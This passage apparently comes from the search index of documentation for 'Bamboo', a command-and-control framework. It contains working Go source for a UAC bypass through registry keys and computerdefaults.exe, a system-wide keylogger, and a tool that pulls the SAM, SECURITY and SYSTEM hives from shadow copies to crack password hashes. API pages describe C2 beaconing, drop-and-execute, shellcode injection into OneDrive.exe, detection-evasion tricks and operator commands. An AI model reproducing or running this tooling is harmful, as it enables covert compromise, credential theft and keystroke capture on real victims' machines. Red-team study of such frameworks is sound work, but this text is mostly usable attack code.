setRegistryValue(registry.CURRENT_USER, keyPath, \"DelegateExecute\", \"\"); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: HKCU\\\\%s\\\\DelegateExecute\\n\", keyPath)\n\n    if err := setRegistryValue(registry.CURRENT_USER, keyPath, \"\", payloadLocation); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: HKCU\\\\%s (Default)\\n\", keyPath)\n\n    // Launch computerdefaults.exe\n    cmd := exec.Command(\"cmd\", \"/C\", \"start computerdefaults.exe\")\n    err := cmd.Start()\n    if err != nil {\n        fmt.Printf(\"Error starting computerdefaults.exe: %v\\n\", err)\n        return\n    }\n    fmt.Println(\"Successfully started computerdefaults.exe\")\n\n}\n\n// Function to set a registry value\nfunc setRegistryValue(root registry.Key, keyPath, valueName, value string) error {\nk, \\_, err := registry.CreateKey(root, keyPath, registry.SET_VALUE)\nif err != nil {\nreturn fmt.Errorf(\"error creating or opening registry key: %v\", err)\n}\ndefer k.Close()\n\n    if err := k.SetStringValue(valueName, value); err != nil {\n        return fmt.Errorf(\"error setting registry value: %v\", err)\n    }\n\n    return nil\n\n}\n</code></pre>"},{"location":"exploits.html#custom-exploits","title":"Custom Exploits","text":"<p>Bamboo is designed to allow users to add their own exploits to the tool. Exploits can be added via the Bamboo Client. View the user guide for more details. </p>"},{"location":"post_exploitation.html","title":"Post Exploitation","text":""},{"location":"post_exploitation.html#machine-enumeration","title":"Machine Enumeration","text":""},{"location":"post_exploitation.html#description","title":"Description","text":"<p>The purpose of Bamboo\u2019s enumeration tool is to enumerate the target machine first before launching an attack. The tool extracts three primary information:</p> <ul> <li>installed applications and their versions</li> <li>machine\u2019s system version</li> <li>security updates installed on the machine (hotfixID and timestamp)</li> </ul>"},{"location":"post_exploitation.html#implementation","title":"Implementation","text":"<p>The team implemented the tool as part of the agent\u2019s capabilities, allowing it to gather detailed information about the target system. The tool\u2019s code is shown in the toggle below.</p> Expand code <pre><code>package post_exploit\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc powershellCsv(command string) (outputString string, err error) {\n    cmd := exec.Command(\"powershell\", command, \"| ConvertTo-Csv -NoTypeInformation\")\n\n    output, err := cmd.Output()\n    if err != nil {\n        return\n    }\n    outputString = string(output)\n    return\n}\n\nfunc EnumerateSystem() (enumerateInfo map[string]string, err error) {\n    enumerateInfo = make(map[string]string)\n\n    // get system information\n    enumerateInfo[\"system\"], err = powershellCsv(\"Get-CimInstance -Class Win32_OperatingSystem | Select-Object BuildNumber, Caption, OSArchitecture\")\n    if err != nil {\n        fmt.Println(\"Error retrieving system information:\", err)\n        return\n    }\n    fmt.Println(\"System Information:\")\n    fmt.Println(enumerateInfo[\"system\"])\n\n    // retrieve Windows update list\n    enumerateInfo[\"updates\"], err = powershellCsv(\"Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object Description, HotFixID, InstalledOn\")\n    if err != nil {\n        fmt.Println(\"Error retrieving update list:\", err)\n        return\n    }\n    fmt.Println(\"\\nWindows Update List:\")\n    fmt.Println(enumerateInfo[\"updates\"])\n\n    // get applications\n    enumerateInfo[\"applications\"], err = powershellCsv(\"Get-Package -ProviderName Programs | Select-Object Name, Version | Sort-Object Name\")\n    if err != nil {\n        fmt.Println(\"Error retrieving installed apps:\", err)\n        return\n    }\n    fmt.Println(\"\\nInstalled Apps and Versions:\")\n    fmt.Println(enumerateInfo[\"applications\"])\n\n    return\n}\n</code></pre> <p>This program consists of two functions: <code>powershellCsv</code> and <code>EnumerateSystem</code> .</p> <p>powershellCsv Function</p> <p>This function takes a PowerShell command as input, executes it, and converts the output to a CSV format.</p> <p>EnumerateSystem Function</p> <p>This is the main function of the program. It creates a map,\u00a0<code>enumerateInfo</code>, to store the collected data. The function then calls\u00a0<code>powershellCsv</code>\u00a0to execute three PowerShell commands:</p> <ol> <li> <p>System Information</p> <p>Retrieves the system's build version, caption, and OS architecture.</p> </li> <li> <p>Windows Updates</p> <p>Retrieves a list of installed Windows updates.</p> </li> <li> <p>Installed Applications</p> <p>Retrieves the list of installed applications and their versions.</p> </li> </ol> <p>The output of each command is stored in the\u00a0<code>enumerateInfo</code>\u00a0map with its respective keys: \u2018system\u2019, \u2018updates\u2019, and \u2018applications.</p>"},{"location":"post_exploitation.html#keylogging","title":"Keylogging","text":""},{"location":"post_exploitation.html#description_1","title":"Description","text":"<p>Bamboo consists of a keylogging tool to capture keystrokes on the victim\u2019s machine. With this tool, Bamboo Client users could potentially collect sensitive information such as passwords, credit card numbers, and more. </p>"},{"location":"post_exploitation.html#implementation_1","title":"Implementation","text":"<p>The team implemented the tool as part of the agent\u2019s capabilities. Its program utilises a GO library, Gohook, which provides a global keyboard and mouse listener hook. The Gohook library uses the Windows API function, <code>SetWindowsHookEx</code> , to install a hook procedure that captures keyboard events. Specifically, it installs a\u00a0<code>WH_KEYBOARD</code>\u00a0hook, which captures keyboard events system-wide. The hook procedure is a callback function that is called whenever a keyboard event occurs. In Gohook, this callback function is implemented in Go and is responsible for processing the keyboard event. The program\u2019s code is as shown in the toggle below.</p> Expand code <pre><code>package post_exploit\n\nimport (\n    \"fmt\"\n    \"strings\"\n    \"time\"\n\n    hook \"github.com/robotn/gohook\"\n)\n\nvar keystrokes []string\n\nfunc hookKeylog(evChan chan hook.Event) {\n    for ev := range evChan {\n        switch ev.Kind {\n        case hook.KeyDown:\n            // handle special keys as spaces\n            switch ev.Keycode {\n            case 8, 9, 13, 16, 17, 18, 32, 33, 34, 35, 36, 37, 38, 40, 45: // keycodes for backspace, tab, enter, space, pageup, pagedown, left, right, up, down, insert, delete, shift, ctrl, alt\n                keystrokes = append(keystrokes, \" \")\n            case 49: // '!'\n                keystrokes = append(keystrokes, \"!\")\n            case 50: // '@'\n                keystrokes = append(keystrokes, \"@\")\n            case 51: // '#'\n                keystrokes = append(keystrokes, \"#\")\n            case 52: // '$'\n                keystrokes = append(keystrokes, \"$\")\n            case 53: // '%'\n                keystrokes = append(keystrokes, \"%\")\n            case 54: // '^'\n                keystrokes = append(keystrokes, \"^\")\n            case 55: // '&amp;'\n                keystrokes = append(keystrokes, \"&amp;\")\n            case 56: // '*'\n                keystrokes = append(keystrokes, \"*\")\n            case 57: // '('\n                keystrokes = append(keystrokes, \"(\")\n            case 48: // ')'\n                keystrokes = append(keystrokes, \")\")\n            case 61: // '='\n                keystrokes = append(keystrokes, \"=\")\n            case 91: // '['\n                keystrokes = append(keystrokes, \"[\")\n            case 93: // ']'\n                keystrokes = append(keystrokes, \"]\")\n            case 92: // '\\'\n                keystrokes = append(keystrokes, \"\\\\\")\n            case 59: // ';'\n                keystrokes = append(keystrokes, \";\")\n            case 39: // '''\n                keystrokes = append(keystrokes, \"'\")\n            case 44: // ','\n                keystrokes = append(keystrokes, \",\")\n            case 46: // '.'\n                keystrokes = append(keystrokes, \".\")\n            case 47: // '/'\n                keystrokes = append(keystrokes, \"/\")\n            case 96: // '`'\n                keystrokes = append(keystrokes, \"`\")\n            case 126: // '~'\n                keystrokes = append(keystrokes, \"~\")\n            default:\n                // for printable characters\n                if ev.Keychar &gt;= ' ' &amp;&amp; ev.Keychar &lt;= '~' {\n                    keystrokes = append(keystrokes, string(ev.Keychar))\n                } else {\n                    // for unknown special characters or non-printable keys, handle accordingly\n                    keystrokes = append(keystrokes, \" \") // record other special keys as space\n                }\n            }\n        // exclude mouse events from being recorded\n        case hook.MouseDown, hook.MouseUp, hook.MouseMove:\n            continue\n        }\n    }\n}\n\nfunc RunKeylogger(keystrokesChan chan string, stopChan chan bool) {\n    // make keystrokes blank\n    keystrokes = make([]string, 0)\n\n    // start event hook\n    evChan := hook.Start()\n    defer hook.End()\n\n    go hookKeylog(evChan)\n\n    ticker := time.NewTicker(5 * time.Second)\n    defer ticker.Stop()\n\n    stop := false\n    for !stop {\n        &lt;-ticker.C\n        // use select with default to make the stop channel not block\n        select {\n        case stop = &lt;-stopChan:\n            fmt.Println(\"Stopping keylogger...\")\n        default:\n            fmt.Printf(\"Keystrokes pressed: %s\\n\", strings.Join(keystrokes, \"\"))\n        }\n        // keystrokes = nil // Reset keystrokes slice after printing\n    }\n    // send back keystrokes through channel\n    keystrokesChan &lt;- strings.Join(keystrokes, \"\")\n}\n</code></pre> <p>This program consists of two functions:\u00a0<code>hookKeylog</code>\u00a0and\u00a0<code>RunKeylogger</code>.</p> <p>hookKeylog Function</p> <p>This function is responsible for handling keyboard events. It takes a channel of hook events as input and processes each event. When a key is pressed, it appends the corresponding character to the\u00a0<code>keystrokes</code>\u00a0slice. The function handles special keys, such as backspace, tab, and enter, by appending a space to the\u00a0<code>keystrokes</code>\u00a0slice. It also handles special characters by appending the corresponding character to the\u00a0<code>keystrokes</code>\u00a0slice. These special characters are handled explicitly in the\u00a0<code>hookKeylog</code>\u00a0function to ensure that they are recorded correctly in the\u00a0<code>keystrokes</code>\u00a0slice.</p> <p>runKeylogger Function</p> <p>The function starts an event hook using the\u00a0<code>hook.Start()</code>\u00a0function and defers the\u00a0<code>hook.End()</code>\u00a0function to stop the hook when the program exits. The function then starts a goroutine to process keyboard events using the\u00a0<code>hookKeylog</code>\u00a0function. It also starts a timer to print the keystrokes every 5 seconds.</p> <p>It listens for a stop signal using\u00a0<code>stopChan</code>\u00a0channel. When a stop signal is received, it stops the keylogger and prints a message indicating that the keylogger has stopped. Finally, the function sends the collected keystrokes through the\u00a0<code>keystrokesChan</code>\u00a0channel.</p>"},{"location":"post_exploitation.html#retrieval-of-registry-hives","title":"Retrieval of Registry Hives","text":""},{"location":"post_exploitation.html#description_2","title":"Description","text":"<p>This tool allows Bamboo Client users to retrieve the SAM (Security Account Manager), SECURITY and SYSTEM files of a Windows machine. These hives contain critical information, detailed in the table below.</p> Registry Hive Description SAM Holds details on local user accounts such as hashed passwords SYSTEM Holds details on the system\u2019s hardware and configurations SECURITY Holds details on user accounts, group policies, and access control lists <p>By obtaining these registry hives, Bamboo Client users can obtain hashed passwords, security tokens, and detailed configuration data. They can even attempt to crack the password hash and use the cracked passwords to compromise other areas. </p> <p>Note. This tool can only be used if the Bamboo Agent is at least at a High privilege level.</p>"},{"location":"post_exploitation.html#implementation_2","title":"Implementation","text":"<p>The team implemented the tool as part of the agent\u2019s capabilities. The program\u2019s code is as shown in the toggle below.</p> Expand code <pre><code>package post_exploit\n\nimport (\n    \"bytes\"\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"regexp\"\n)\n\n// Get the latest shadow copy volume\nfunc getLatestShadowCopy() (string, error) {\n    cmd := exec.Command(\"vssadmin\", \"list\", \"shadows\")\n    var out bytes.Buffer\n    cmd.Stdout = &amp;out\n    err := cmd.Run()\n    if err != nil {\n        return \"\", err\n    }\n\n    // Extract all shadow copies\n    re := regexp.MustCompile(`Shadow Copy Volume: (\\\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy\\d+)`)\n    matches := re.FindAllStringSubmatch(out.String(), -1)\n\n    if len(matches) == 0 {\n        return \"\", fmt.Errorf(\"no shadow copies found\")\n    }\n\n    // Return the latest shadow copy volume\n    return matches[len(matches)-1][1], nil\n}\n\nfunc readFile(sourceFile string) (data []byte, err error) {\n    data, err = os.ReadFile(sourceFile)\n    if err != nil {\n        fmt.Println(err)\n    }\n    return\n}\n\n// read files from shadow copy\nfunc readFilesFromShadowCopy(shadowCopyVolume string) (fileData map[string][]byte, err error) {\n    fileData = make(map[string][]byte)\n    filesToCopy := []string{\"system\", \"sam\", \"security\"}\n    sourceFolder := fmt.Sprintf(\"%s\\\\windows\\\\system32\\\\config\\\\\", shadowCopyVolume)\n\n    for _, file := range filesToCopy {\n        sourceFile := sourceFolder + file\n        fmt.Printf(\"Reading %s\\n\", sourceFile)\n\n        fileData[file], err = readFile(sourceFile)\n        if err != nil {\n            err = fmt.Errorf(\"error copying file %s: %w\", file, err)\n            return\n        }\n    }\n\n    return\n}\n\nfunc SSSRetriver() (fileData map[string][]byte, err error) {\n    // destinationFolder := \"C:\\\\temp\"\n\n    shadowCopyVolume, err := getLatestShadowCopy()\n    if err != nil {\n        fmt.Printf(\"An error occurred: %s\\n\", err)\n        return\n    }\n\n    fmt.Printf(\"Latest shadow copy volume: %s\\n\", shadowCopyVolume)\n    fileData, err = readFilesFromShadowCopy(shadowCopyVolume)\n    if err != nil {\n        fmt.Printf(\"An error occurred: %s\\n\", err)\n        return\n    }\n\n    fmt.Println(\"Files copied successfully.\")\n    return\n}\n</code></pre> <p>This program consists of three functions:\u00a0<code>getLatestShadowCopy</code>,\u00a0<code>readFile</code>, and\u00a0<code>readFilesFromShadowCopy</code>.</p> <p>getLatestShadowCopy Function</p> <p>This function retrieves the latest shadow copy volume using the\u00a0<code>vssadmin</code>\u00a0command. It runs the command, captures the output, and extracts the latest shadow copy volume using a regular expression.</p> <p>readFile Function</p> <p>This function reads a file from the specified source file path and returns the file data.</p> <p>readFilesFromShadowCopy Function</p> <p>This function reads files from the shadow copy volume. It takes the shadow copy volume as input, constructs the source folder path, and reads three specific files:\u00a0<code>system</code>,\u00a0<code>sam</code>, and\u00a0<code>security</code>. The file data is stored in a map with the keys as its file names.</p> <p>SSSRetriver Function</p> <p>This is the main function of the program. It retrieves the latest shadow copy volume using\u00a0<code>getLatestShadowCopy</code>, reads the files from the shadow copy volume using\u00a0<code>readFilesFromShadowCopy</code>, and returns the file data.</p>"},{"location":"Agent/overview.html","title":"Overview","text":"<p>This section of the document includes information pertaining to the Bamboo Client. </p> <p>Below is the file structure of the Bamboo Agent </p> <pre><code>agent\n\u251c\u2500\u2500 connect\n\u2502   \u251c\u2500\u2500 c2_api\n\u2502   \u2502   \u251c\u2500\u2500 c2_api.go \n\u2502   \u251c\u2500\u2500 websocket\n|   |   \u251c\u2500\u2500 websocket.go\n\u251c\u2500\u2500 exploit\n\u2502   \u251c\u2500\u2500 embed\n\u2502   \u2502   \u251c\u2500\u2500 ntqueueapcthreadex.exe\n\u2502   \u251c\u2500\u2500 disk-drop.go\n\u2502   \u251c\u2500\u2500 inject.go\n\u251c\u2500\u2500 post_exploit\n\u2502   \u251c\u2500\u2500 enumerate.go\n\u2502   \u251c\u2500\u2500 keylogger.go\n\u2502   \u251c\u2500\u2500 sssretrieve.go\n\u251c\u2500\u2500 agent.go\n\u251c\u2500\u2500 default-ip.txt\n\u251c\u2500\u2500 go.mod\n\u251c\u2500\u2500 go.sum\n\u2514\u2500\u2500 helper.go\n</code></pre>"},{"location":"Agent/Packages/agent-connect-c2_api.html","title":"agent/connect/c2_api","text":"<p>The package that exports functions used to interact with the Teamserver via HTTP APIs</p>"},{"location":"Agent/Packages/agent-connect-c2_api.html#c2-connection-functions","title":"C2 Connection Functions","text":""},{"location":"Agent/Packages/agent-connect-c2_api.html#c2_http","title":"C2_http","text":"<p>Make a request to the Teamserver's HTTP APIs</p> <p>Parameters</p> Parameter Type Description url string Address of the server in format ip:port endpoint string The resource to connect to on the Teamserver method string The HTTP RESTful method to use (GET, POST) message any Map of body to send to Teamserver <p>Return</p> Type Description map[string]any Server response error Error from request if any"},{"location":"Agent/Packages/agent-connect-c2_api.html#getfile","title":"GetFile","text":"<p>Download file from Teamserver (at /agent/download/&lt;filename&gt;)</p> <p>Parameters</p> Parameter Type Description url string Address of the server in format ip:port filename string Name of file to download <p>Return</p> Type Description []byte File in bytes slice error Error from request if any"},{"location":"Agent/Packages/agent-connect-c2_api.html#data-parsing-functions","title":"Data Parsing Functions","text":"<p>These functions are not exported but rather used by C2_http to handle the request and response body. </p>"},{"location":"Agent/Packages/agent-connect-c2_api.html#datatohttpbody","title":"dataToHttpBody","text":"<p>Convert from map variable into io.Reader that can be used with the http package</p> <p>Parameters</p> Parameter Type Description data any Map of body to convert to send <p>Return</p> Type Description io.Reader Reader interface to be used by http error Error from request if any"},{"location":"Agent/Packages/agent-connect-c2_api.html#httpbodytodata","title":"httpBodyToData","text":"<p>Download file from Teamserver (at /agent/download/&lt;filename&gt;)</p> <p>Parameters</p> Parameter Type Description http_body io.ReadCloser Reader returned by http response <p>Return</p> Type Description map[string]any Map response data error Error from request if any"},{"location":"Agent/Packages/agent-connect-websocket.html","title":"agent/connect/websocket","text":"<p>The package that exports functions used to connect and communicate with the Teamserver over WebSocket</p>"},{"location":"Agent/Packages/agent-connect-websocket.html#websocket-functions","title":"WebSocket functions","text":""},{"location":"Agent/Packages/agent-connect-websocket.html#send_data","title":"Send_data","text":"<p>Send data through a established Websocket connection</p> <p>Parameters</p> Parameter Type Description conn *websocket.Conn Pointer to Websocket connection object message map[string]any Message to send <p>Return</p> Type Description error Error from Websocket if any"},{"location":"Agent/Packages/agent-connect-websocket.html#receive_data","title":"Receive_data","text":"<p>Listen to messages from Teamserver over Websocket</p> <p>Parameters</p> Parameter Type Description conn *websocket.Conn Pointer to Websocket connection object <p>Return</p> Type Description message map[string]any error Error from Websocket if any"},{"location":"Agent/Packages/agent-connect-websocket.html#init_conn","title":"Init_conn","text":"<p>Initialize Websocket connection with the Teamserver</p> <p>Parameters</p> Parameter Type Description c2_url string Address of the server in format ip:port agent_id string Agent identifier issued by Teamserver <p>Return</p> Type Description conn *websocket.Conn error Error from Websocket if any"},{"location":"Agent/Packages/agent-exploit.html","title":"agent/exploit","text":"<p>The package used to run exploits, either by injection or dropping and running from disk</p>"},{"location":"Agent/Packages/agent-exploit.html#file-functions","title":"File Functions","text":""},{"location":"Agent/Packages/agent-exploit.html#dropfile","title":"DropFile","text":"<p>Write a file from a variable to the disk</p> Parameter Type Description exe []byte The contents of the file filename string Name of file to use <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-exploit.html#deleteexefile","title":"DeleteExeFile","text":"<p>Deletes a file (usually an executable) from disk. This function will first try to rename it to a placeholder name that does not have the .exe extension before deleting to evade the Process Termination followed by Deletion rule.</p> Parameter Type Description filename string Name of file to delete <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-exploit.html#droptodisk","title":"DropToDisk","text":"<p>Uses the DropFile function to create a file and execute it with a shell. </p> Parameter Type Description exe []byte The contents of the file <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-exploit.html#injection-functions","title":"Injection Functions","text":""},{"location":"Agent/Packages/agent-exploit.html#virturalalloc","title":"VirturalAlloc","text":"<p>Performs Virtural Allocation injection. For more information, refer to evasion.</p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-exploit.html#remotethreadinjection","title":"RemoteThreadInjection","text":"<p>Performs Remote Thread injection in OneDrive.exe. For more information, refer to evasion.</p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-exploit.html#ntdllgadgetinjection","title":"NtDllGadgetInjection","text":"<p>Performs NtQueueApcThreadEx NTDLL Gadget Injection. For more information, refer to evasion</p> Parameter Type Description payload string Hex string of shellcode to run <p>Return</p> Type Description error Error created if any"},{"location":"Agent/Packages/agent-post_exploit.html","title":"agent/post-exploit","text":"<p>Package for the functions to perform system enumeration and post exploitation. For more details on how they work, refer to post-exploitation.</p>"},{"location":"Agent/Packages/agent-post_exploit.html#enumeration-function","title":"Enumeration function","text":""},{"location":"Agent/Packages/agent-post_exploit.html#powershellcsv","title":"powershellCsv","text":"<p>Run a command in powershell</p> <p>Parameters</p> Parameter Type Description command string Command to run <p>Return</p> Type Description string Output of command error Error from command if any"},{"location":"Agent/Packages/agent-post_exploit.html#enumeratesystem","title":"EnumerateSystem","text":"<p>Uses powershellCsv to run specific commands for enumerating the host system  </p> <ul> <li>System Information  </li> <li>Updates installed  </li> <li>Applications installed</li> </ul> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string]string Result of command error Error from command if any"},{"location":"Agent/Packages/agent-post_exploit.html#keylogger","title":"Keylogger","text":""},{"location":"Agent/Packages/agent-post_exploit.html#hookkeylog","title":"hookKeylog","text":"<p>Listens and records keys entered</p> <p>Parameters</p> Parameter Type Description evChan chan hook.Event Listens to keyboard activity <p>Return</p> <p>None</p>"},{"location":"Agent/Packages/agent-post_exploit.html#runkeylogger","title":"RunKeylogger","text":"<p>Starts the keylogging function, and listens for a stop command to stop and transfer logged keys</p> <p>Parameters</p> Parameter Type Description keystrokesChan chan string Channel out of function which returns keys logged stopChan chan bool Channel into function to instruct it to stop <p>Return</p> <p>None</p>"},{"location":"Agent/Packages/agent-post_exploit.html#retrieve-registry-hives-sssretrieve","title":"Retrieve Registry Hives (sssretrieve)","text":""},{"location":"Agent/Packages/agent-post_exploit.html#getlatestshadowcopy","title":"getLatestShadowCopy","text":"<p>Get the latest shadow copy volume</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description string The latest shadow copy volume error Error from command if any"},{"location":"Agent/Packages/agent-post_exploit.html#readfile","title":"readFile","text":"<p>Read the contents of a file</p> <p>Parameters</p> Parameter Type Description sourceFile string Path of file to read <p>Return</p> Type Description []byte Contents of file error Error created if any"},{"location":"Agent/Packages/agent-post_exploit.html#readfilesfromshadowcopy","title":"readFilesFromShadowCopy","text":"<p>Read the contents of the registry hives (sam, security, system) given the shadow copy </p> <p>Parameters</p> Parameter Type Description shadowCopyVolume string Location of latest shadow copy <p>Return</p> Type Description map[string][]byte Contents of files error Error created if any"},{"location":"Agent/Packages/agent-post_exploit.html#sssretriver","title":"SSSRetriver","text":"<p>Runs the registry hive retriever function, by using the functions above </p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string][]byte Contents of files error Error created if any"},{"location":"Agent/Packages/agent.html","title":"agent","text":"<p>The main package for the agent </p>"},{"location":"Agent/Packages/agent.html#global-variables","title":"Global Variables","text":"Parameter Type Description Default Value DEFAULT_TEAMSERVER_IP string Default IP address to query Teamserver, declared with a go:embed directive The value in default-ip.txt TEAMSERVER_URL string Used to store the full address of the Teamserver, in format ip:port SKIP_PRIV bool Used to store whether the -skip-priv parameter was used keylogHandler string Used to store which handler started the keylogging keyloggingStatus bool Indicate whether the keylogger is currently running or not false keystrokesChan chan string Used by the keylogging function to send back the keys captured stopChan chan bool Used to send a true value to the keylogging function to return the function"},{"location":"Agent/Packages/agent.html#functions","title":"Functions","text":""},{"location":"Agent/Packages/agent.html#setglobalvars","title":"setGlobalVars","text":"<p>Used to set global variables from the command line arguments</p> <p>Parameters</p> <p>None</p> <p>Return</p> <p>None</p>"},{"location":"Agent/Packages/agent.html#executecommand","title":"executeCommand","text":"<p>Run a command in the command prompt</p> <p>Parameters</p> Parameter Type Description command string Command to run <p>Return</p> Type Description string Output of command error Error from command if any"},{"location":"Agent/Packages/agent.html#splitcsvstring","title":"splitCsvString","text":"<p>Split a line of string from a CSV formatted input and return as a slice</p> <p>Parameters</p> Parameter Type Description csvstr string CSV formatted string <p>Return</p> Type Description []string Slice of string"},{"location":"Agent/Packages/agent.html#getprivilgelevel","title":"getPrivilgeLevel","text":"<p>Get the user and privilege level the agent is running as</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description string Integrity level string Username"},{"location":"Agent/Packages/agent.html#hostinfo","title":"hostInfo","text":"<p>Get host information such as - hostname - privateIP - publicIP - integrity - user</p> <p>Parameters</p> <p>None</p> <p>Return</p> Type Description map[string]any Map of host information"},{"location":"Agent/Packages/agent.html#init_conn","title":"init_conn","text":"<p>Connect and register with the Teamserver via HTTPS API</p> <p>Parameters</p> Parameter Type Description host_info map[string]any Map of host information <p>Return</p> Type Description string Agent identifier issued by Teamserver"},{"location":"Agent/Packages/agent.html#heartbeat","title":"heartbeat","text":"<p>An infinite loop to send the Teamserver heartbeats every 5-10 seconds. Ran in a goroutine</p> <p>Parameters</p> Parameter Type Description agent_identifier string Agent identifier issued by Teamserver <p>Return</p> <p>None</p>"},{"location":"Agent/Packages/agent.html#runexploits","title":"runExploits","text":"<p>Switch case and logic to select how to run the exploit and executes it</p> <p>Parameters</p> Parameter Type Description message map[string]any Message sent from Teamserver <p>Return</p> Type Description error Error from running exploit if any"},{"location":"Agent/Packages/agent.html#runpostexploit","title":"runPostExploit","text":"<p>Switch case and logic to run a post exploit function or enumeration</p> <p>Parameters</p> Parameter Type Description message map[string]any Message sent from Teamserver priv string Integrity level of agent <p>Return</p> Type Description map[string]any Map of data to send back to the Teamserver string Teamserver URL to send result to error Error from running functions if any"},{"location":"Agent/Packages/agent.html#menu","title":"menu","text":"<p>Listen for a Websocket message and carry out its command</p> <p>Parameters</p> Parameter Type Description ws_conn *websocket.Conn Pointer to Websocket connection object agent_identifier string Agent identifier issued by Teamserver priv string Integrity level of agent <p>Return</p> <p>None</p>"},{"location":"Agent/Packages/agent.html#domanyprint","title":"DoManyPrint","text":"<p>Prints a string many times, each ended with a carriage return (\\r). Used in an attempt to evade detection. </p> Parameter Type Description text string The string to print <p>Return</p> Type Description int The number 8"},{"location":"Client/commands.html","title":"Commands","text":"<p>This is not a user guide, this is the documentation for Bamboo Client Commands. Bamboo Client offers a wide variety of commands in both CLI and GUI interface. This enables users to interact with the Bamboo Teamserver, Bamboo Agent, and even other Bamboo Client users. The table below contains all the commands that Bamboo offers. The commands below are mainly for the CLI and may defer in the GUI. Use the <code>help</code> command see the difference in the GUI.</p> Command Description <code>help</code> Displays command list <code>exit</code>/<code>quit</code> Exit handler <code>chat</code> Send/Receive message in team chat <code>clear</code> Clear chat logs <code>users</code> Display all handler information <code>register</code> Add in a new handler <code>remove [handler]</code> Remove handler from DB <code>display</code> Display all agent information <code>use [agent]</code> Start using an agent <code>kill [agent]</code> Remove agent from DB <code>exp</code> View all exploits in DB <code>add</code> Add exploit to DB (CLI cannot upload file) <code>delete [exploit]</code> Remove exploit from DB <code>modify [exploit]</code> Modify exploit in DB <p>When Handler is Using an Agent with <code>use</code></p> Command Description <code>stop</code> Stop using agent <code>info</code> Displays information of current agent <code>exploit</code> Run specific exploit in agent <code>cmd</code> Run commands in agent <code>enum</code> Enumerate victim machine <code>postexp [method]</code> Run post exploit"},{"location":"Client/commands.html#help","title":"help","text":"<p>Show the help menu that lists all commands and descriptions.</p> CLI Command GUI Command Command <code>help</code> <code>help</code> Null"},{"location":"Client/commands.html#exitquit","title":"exit/quit","text":"<p>Exit Bamboo Client.</p> CLI Command GUI Command Command <code>exit/quit</code> <code>exit/quit</code> auth.logout"},{"location":"Client/commands.html#chat","title":"chat","text":"<p>Open team chat to send/receive chat messages from other Bamboo Clients.</p> CLI Command GUI Command Command <code>chat</code> TEAMCHAT tab TeamChatReaderWriter.run_chat"},{"location":"Client/commands.html#clear","title":"clear","text":"<p>Clear chat messages.</p> CLI Command GUI Command Command <code>clear</code> <code>clear</code> TeamChatReaderWriter.clearchat"},{"location":"Client/commands.html#users","title":"users","text":"<p>Display all users with their status.</p> CLI Command GUI Command Command <code>users</code> <code>users</code>/dropdown menu handler_func.view_users"},{"location":"Client/commands.html#register","title":"register","text":"<p>Register a new user into the database.</p> CLI Command GUI Command Command <code>register --username [username] --pw [password]</code> <code>register</code>/dropdown menu handler_func.register_user"},{"location":"Client/commands.html#remove","title":"remove","text":"<p>Remove a handler from the database.</p> CLI Command GUI Command Command <code>remove [handler]</code> <code>remove [handler]</code> handler_func.delete_user"},{"location":"Client/commands.html#display","title":"display","text":"<p>Display all agent information.</p> CLI Command GUI Command Command <code>display</code> <code>display</code>/dropdown menu handler_func.display"},{"location":"Client/commands.html#use","title":"use","text":"<p>Start using an agent.</p> CLI Command GUI Command Command <code>use [agent]</code> <code>use [agent]</code> handler_func.use_agent"},{"location":"Client/commands.html#kill","title":"kill","text":"<p>Kill an agent and remove it from the database.</p> CLI Command GUI Command Command <code>kill [agent]</code> <code>kill [agent]</code>/dropdown menu handler_func.remove_agent"},{"location":"Client/commands.html#exp","title":"exp","text":"<p>View all exploits in the database.</p> CLI Command GUI Command Command <code>exp</code> <code>exp</code>/dropdown menu exploits.view_exploits"},{"location":"Client/commands.html#add","title":"add","text":"<p>Add an exploit into the database.</p> CLI Command GUI Command Command <code>add</code> <code>add</code>/dropdown menu exploit.add_exploit"},{"location":"Client/commands.html#delete","title":"delete","text":"<p>Delete an exploit from the database.</p> CLI Command GUI Command Command <code>delete [exploit]</code> <code>delete [exploit]</code>/dropdown menu exploit.del_exploit"},{"location":"Client/commands.html#modify","title":"modify","text":"<p>Modify an exploit in the database.</p> CLI Command GUI Command Command <code>modify [exploit]</code> <code>modify</code>/dropdown menu exploit.modify <p>When the Client is Using an Agent with <code>use</code></p>"},{"location":"Client/commands.html#stop","title":"stop","text":"<p>Stop using the agent.</p> CLI Command GUI Command Command <code>stop</code> <code>stop</code> handler_func.stop_agent"},{"location":"Client/commands.html#info","title":"info","text":"<p>Display information of the current agent.</p> CLI Command GUI Command Command <code>info</code> <code>info</code> handler_func.info_status"},{"location":"Client/commands.html#exploit","title":"exploit","text":"<p>Command the agent to run an exploit.</p> CLI Command GUI Command Command <code>exploit</code> <code>exploit</code> commands.exploit_process"},{"location":"Client/commands.html#cmd","title":"cmd","text":"<p>Run commands in the agent.</p> CLI Command GUI Command Command <code>cmd</code> <code>cmd</code> commands.command_prompt"},{"location":"Client/commands.html#enum","title":"enum","text":"<p>Enumerate the agent machine.</p> CLI Command GUI Command Command <code>enum</code> <code>enum</code>/buttons commands.enum"},{"location":"Client/commands.html#postexp","title":"postexp","text":"<p>Run a post exploit.</p> CLI Command GUI Command Command <code>postexp [method]</code> <code>postexp [method]</code>/buttons commands.postexp"},{"location":"Client/misc_func.html","title":"Miscellaneous Functions","text":"<p>The functions below shows all the miscellaneous functions that can be found in Bamboo Client.</p> 